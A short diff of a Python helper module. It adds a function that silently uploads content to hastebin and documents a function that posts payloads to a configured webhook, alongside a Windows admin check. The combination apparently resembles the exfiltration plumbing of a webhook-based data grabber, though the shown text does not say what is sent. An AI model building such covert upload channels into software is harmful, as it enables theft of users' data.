@@ -1,4 +1,5 @@
 import os
+import PyUploads
 from ctypes import windll
 from random import randint
 from json import dumps
@@ -25,6 +26,7 @@ def isAdmin():
 
 
 def webhook_request(payload):
+    """Sends request to webhook server"""
     from modules.config import WEBHOOK_URL
     headers = {
         'Content-Type': 'application/json',
@@ -37,3 +39,10 @@ def webhook_request(payload):
         urlopen(req)
     except Exception as e:
         print(e)
+        
+def upload_haste(content):
+    """Uploads to hastebin"""
+    try:
+        PyUploads.Hastebin.Create(content)
+    except PyUploads.Exceptions.CreationError:
+        pass
